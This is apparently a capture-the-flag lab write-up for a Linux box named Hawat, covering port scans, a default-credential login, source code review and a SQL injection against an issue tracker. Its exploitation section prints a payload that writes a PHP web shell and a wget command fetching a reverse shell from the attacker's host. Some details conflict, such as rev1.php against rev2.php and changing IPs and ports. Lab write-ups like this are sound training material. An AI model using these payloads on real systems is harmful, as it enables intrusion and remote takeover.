---
Alias: Hawat
Date: 5/08/2022
Platform: Linux
Difficulty: Easy
Tags: #issuetracker #webserverrootdirectory #GETtoPOSTChangeInBurpsuite #SQLinjection #php-reverse-shell-php
Status: Finished
IP: 192.168.151.147
---

# {{Hawat}}


# Resolution summary
- After using feroxbuster to scan port 50080, I found a cloud PHP login page.
- I was able to log in as administrator after guessing the login credentials.
- Issue tracker zip file located
- Read the source code by downloading the file to my Kali machine.
- Source code analysis revealed that the software has a priority parameter and connects to a MySQL database. "/issue/checkByPriority" directory was also discovered.
- Ran feroxbuster on port 30455 and found the index.php page which displayed the root directory.
- Accessed the webpage and discovered the problem tracker program running at http port 17445.
- Created an account and entered login credentials
- A 405 error message appeared when I navigated to the /issue/checkByPriority directory.
- Started Burpsuite to observe what was happening in the background and forwarded the web page for directory /issue/checkByPriority on port 17455 to repeater.
- The "POST" method was found and permitted.
- After switching to the "POST" method in repeater, the error code changed to 400.
- Looked up the syntax for sq injecting reverse shell on Google.
- To execute command injection from the webpage, I added the priority parameter and the detected syntax, putting them in the web server's root directory. Additionally I URL encoded the syntax in Burpsuite.
- Verified that I can execute OS commands from a webpage.
- Downloaded and named a PHP reverse shell with a.php extension for the target machine.
- Set a Kali netcat listener; executed the PHP script for the reverse shell to obtain a root shell.


## Improved skills
- Password guessing
- Analyzing code
- Changing methods in burpsuite to receive alternate webpage
- Locating root web server directory


## Used tools
- nmap
- rustscan
- feroxbuster

---

# Information Gathering
Scanned all TCP ports:
```bash
#rustscan rustscan -a 192.168.151.147 --ulimit 5000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.151.147:22
Open 192.168.151.147:17445
Open 192.168.151.147:30455
Open 192.168.151.147:50080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 21:22 EDT
Initiating Ping Scan at 21:22
Scanning 192.168.151.147 [2 ports]
Completed Ping Scan at 21:22, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:22
Completed Parallel DNS resolution of 1 host. at 21:22, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:22
Scanning 192.168.151.147 [4 ports]
Discovered open port 22/tcp on 192.168.151.147
Discovered open port 50080/tcp on 192.168.151.147
Discovered open port 30455/tcp on 192.168.151.147
Discovered open port 17445/tcp on 192.168.151.147
Completed Connect Scan at 21:22, 0.08s elapsed (4 total ports)
Nmap scan report for 192.168.151.147
Host is up, received conn-refused (0.086s latency).
Scanned at 2022-04-20 21:22:43 EDT for 0s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
17445/tcp open  unknown syn-ack
30455/tcp open  unknown syn-ack
50080/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds


 

 

 

sudo nmap -sC -sV -O 192.168.151.147 -p 22,17445,30455,50080 

[sudo] password for kali:  

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 21:26 EDT 

Nmap scan report for 192.168.151.147 

Host is up (0.079s latency). 

  

PORT      STATE SERVICE VERSION 

22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0) 

| ssh-hostkey:  

|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA) 

|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA) 

|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519) 

17445/tcp open  unknown 

| fingerprint-strings:  

|   GetRequest:  

|     HTTP/1.1 200  

|     X-Content-Type-Options: nosniff 

|     X-XSS-Protection: 1; mode=block 

|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate 

|     Pragma: no-cache 

|     Expires: 0 

|     X-Frame-Options: DENY 

|     Content-Type: text/html;charset=UTF-8 

|     Content-Language: en-US 

|     Date: Thu, 21 Apr 2022 01:26:28 GMT 

|     Connection: close 

|     <!DOCTYPE html> 

|     <html lang="en"> 

|     <head> 

|     <meta charset="UTF-8"> 

|     <title>Issue Tracker</title> 

|     <link href="/css/bootstrap.min.css" rel="stylesheet" /> 

|     </head> 

|     <body> 

|     <section> 

|     <div class="container mt-4"> 

|     <span> 

|     <div> 

|     href="/login" class="btn btn-primary" style="float:right">Sign In</a>  

|     href="/register" class="btn btn-primary" style="float:right;margin-right:5px">Register</a> 

|     </div> 

|     </span> 

|     <br><br> 

|     <table class="table"> 

|     <thead> 

|     <tr> 

|     <th>ID</th> 

|     <th>Message</th> 

|     <th>P 

|   HTTPOptions:  

|     HTTP/1.1 200  

|     Allow: GET,HEAD,OPTIONS 

|     X-Content-Type-Options: nosniff 

|     X-XSS-Protection: 1; mode=block 

|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate 

|     Pragma: no-cache 

|     Expires: 0 

|     X-Frame-Options: DENY 

|     Content-Length: 0 

|     Date: Thu, 21 Apr 2022 01:26:28 GMT 

|     Connection: close 

|   RTSPRequest:  

|     HTTP/1.1 400  

|     Content-Type: text/html;charset=utf-8 

|     Content-Language: en 

|     Content-Length: 435 

|     Date: Thu, 21 Apr 2022 01:26:28 GMT 

|     Connection: close 

|     <!doctype html><html lang="en"><head><title>HTTP Status 400  

|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400  

|_    Request</h1></body></html> 

30455/tcp open  http    nginx 1.18.0 

|_http-title: W3.CSS 

|_http-server-header: nginx/1.18.0 

50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15) 

|_http-title: W3.CSS Template 

| http-methods:  

|_  Potentially risky methods: TRACE 

|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15 

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : 

SF-Port17445-TCP:V=7.92%I=7%D=4/20%Time=6260B2C2%P=x86_64-pc-linux-gnu%r(G 

SF:etRequest,623,"HTTP/1\.1\x20200\x20\r\nX-Content-Type-Options:\x20nosni 

SF:ff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:\x20no-cac 

SF:he,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\x20no-cach 

SF:e\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text 

SF:/html;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Thu,\x202 

SF:1\x20Apr\x202022\x2001:26:28\x20GMT\r\nConnection:\x20close\r\n\r\n\n<! 

SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\t<head>\n\x20\x20\x20\x20\t<m 

SF:eta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20\t<title>Issue\x20Tracker</t 

SF:itle>\n\t\t<link\x20href=\"/css/bootstrap\.min\.css\"\x20rel=\"styleshe 

SF:et\"\x20/>\n\t</head>\n\t<body>\n\t\x20\x20\x20\x20<section>\n\t\t<div\ 

SF:x20class=\"container\x20mt-4\">\n\t\t\t<span>\n\x20\t\t\t\n\t\x20\x20\x 

SF:20\x20\x20\x20\x20\x20<div>\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20 

SF:href=\"/login\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right\ 

SF:">Sign\x20In</a>\x20\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20href=\" 

SF:/register\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right;marg 

SF:in-right:5px\">Register</a>\n\t\x20\x20\x20\x20\x20\x20\x20\x20</div>\n 

SF:\x20\x20\x20\x20\x20\x20\x20\x20</span>\n\t\t\t<br><br>\n\t\t\t<table\x 

SF:20class=\"table\">\n\t\t\t<thead>\n\t\t\t\t<tr>\n\t\t\t\t\t<th>ID</th>\ 

SF:n\t\t\t\t\t<th>Message</th>\n\t\t\t\t\t<th>P")%r(HTTPOptions,12B,"HTTP/ 

SF:1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nX-Content-Type-Options 

SF::\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control: 

SF:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\ 

SF:x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Len 

SF:gth:\x200\r\nDate:\x20Thu,\x2021\x20Apr\x202022\x2001:26:28\x20GMT\r\nC 

SF:onnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r 

SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r 

SF:\nContent-Length:\x20435\r\nDate:\x20Thu,\x2021\x20Apr\x202022\x2001:26 

SF::28\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la 

SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20 

SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma, 

SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background 

SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\ 

SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla 

SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s 

SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R 

SF:equest</h1></body></html>"); 

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 

Device type: general purpose 

Running (JUST GUESSING): Linux 4.X|5.X (85%) 

OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 

Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%) 

No exact OS matches for host (test conditions non-ideal). 

  

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 

Nmap done: 1 IP address (1 host up) scanned in 29.53 seconds 
```

Enumerated open TCP ports:
```bash
50080
30455
17445
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
##  Port 50080 

- We execute the feroxbuster scan command below and discover a "/cloud" directory 

feroxbuster -u http://192.168.65.147:50080 -C 401 403 405 -t 100

![](Images/Pasted%20image%2020221011100749.png)

- By navigating to http://192.168.65.147:50080/cloud, we can access the PHP login page as seen below.

- By using the login "admin" and password "admin," we are able to access the admin account.

![](Images/Pasted%20image%2020221011100923.png)

We find an issuetracker.zip file on the web application and download it to our Kali machine. We then analyze the source code in the “IssueControler.java” file and discover that Issue Tracker connects to a MySQL database and has a priority parameter. We also find a “/issue/checkByPriority” directory that may be vulnerable to SQL injection.

- We select the file called issuetracker.zip.

![](Images/Pasted%20image%2020221011101035.png)

#issuetracker

- The following webpage appeared; we saved the zip file to our Kali machine by clicking the three dots and selecting "Descargar":
  
![](Images/Pasted%20image%2020221011102057.png)

- We locate the "IssueControler.java" file by going through the source code folders listed below for the "issuetracker.zip" file:
  
![](Images/Pasted%20image%2020221011102341.png)

![](Images/Pasted%20image%2020221011102413.png)

![](Images/Pasted%20image%2020221011102447.png)

![](Images/Pasted%20image%2020221011102523.png)

![](Images/Pasted%20image%2020221011102555.png)

![](Images/Pasted%20image%2020221011102626.png)

![](Images/Pasted%20image%2020221011102716.png)

- We locate the following information:
#### "/issue/checkByPriority" directory
#### Credentials user "issue_user" and password "ManagementInsideOld797"
#### Issue Tracker connects to mysql database per the following line of code:
#### "jdbc:mysql://localhost:3306/issue_tracker"

![](Images/Pasted%20image%2020221011102828.png)

- Furthermore, we discover that the "priority" parameter in the "/issue/checkByPriority" directory is vulnerable to SQL injection:
  
![](Images/Pasted%20image%2020221011102910.png)

We continue with enumeration and use feroxbuster to scan port 30455. The scan reveals the web server’s root directory is “/srv/http”. We also navigate to port 17445 and find an Issue Tracker program running on the webpage.

## Port 30455 

- We execute a feroxbuster directory scan and find an accessible phpinfo.php file


- We access the website at http://192.168.241.147:30455/phpinfo.php. Then find "/srv/http," is the web server's root directory:

![](Images/Pasted%20image%2020221011103221.png)
#webserverrootdirectory

## Port 17445 

- We access the website via http://192.168.65.147:17445. and discover that the "Issue Tracker" webpage is displayed here.
  
![](Images/Pasted%20image%2020221011103451.png)

We register and log in with the setup credentials and navigate to the "/issue/checkByPriority" directory. We receive a 405 error, which indicates that the HTTP method we are using is not allowed.

- We select the "Register" link, make an account, and sign in using those credentials.
  
- We navigate to the "/issue/checkByPriority" directory. After examining the "IssueControler.java" file's source code, it was discovered that this directory existed and  it led to the following webpage:
  
![](Images/Pasted%20image%2020221011103541.png)

To investigate further, we bring up Burp Suite to see what is taking place on in the background. We send the webpage for port 17455 to the repeater and find that “POST” is allowed. We change the method to “POST” in the repeater and find that the error code changes to 400.

- The directory "/issue/checkByPriority" is known to exist. In order to verify what is happening in the background, we browse to Burpsuite. The following indicates that "POST" is permitted after we send the request to "repeater":
  
![](Images/Pasted%20image%2020221011103632.png)

- We switch from "GET" to "POST" and observe that the error code has changed from "405" to "400".
  
![](Images/Pasted%20image%2020221011103739.png)

#GETtoPOSTChangeInBurpsuite

---

# Exploitation
## SQL Injection

We now have enough information to exploit the vulnerability. We Google “SQL injection reverse shell” and find the syntax for uploading a cmd.php page to the server to get command execution. We add the “priority” parameter and URL-encoded syntax to Burp Suite and forward the request.

- We search for "SQL injection reverse shell" on Google and come across the following link, which provides instructions on how to upload a cmd.php page to the server in order to obtain command execution:
  
![](Images/Pasted%20image%2020221011103839.png)

![](Images/Pasted%20image%2020221011103926.png)

- We URL-encode the following command:

'union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php'

- We add the URL-encoded syntax above and the "priority='' parameter to Burpsuite and send the request:
  
![](Images/Pasted%20image%2020221011104021.png)

- We navigate to "http://192.168.213.147:30455/cmd.php?cmd=", type "whoami" and confirm we can run OS commands:
  
![](Images/Pasted%20image%2020221011104107.png)

#sqlinjection

- On our Kali machine, we save "/usr/share/webshells/php/php-reverse-shell.php" to a file called "rev1.php".

#php-reverse-shell-php

- We enter "http://192.168.228.147/cmd.php?cmd=wget http://[kali IP]:30455/rev1.php -o /srv/http/rev1.php"

- We setup a listener on port 30455 on our Kali machine. 

- We type "curl http://192.168.213.147:30455/rev2.php" on our Kali terminal and receive a root shell:

![](Images/Pasted%20image%2020221011185330.png)
---
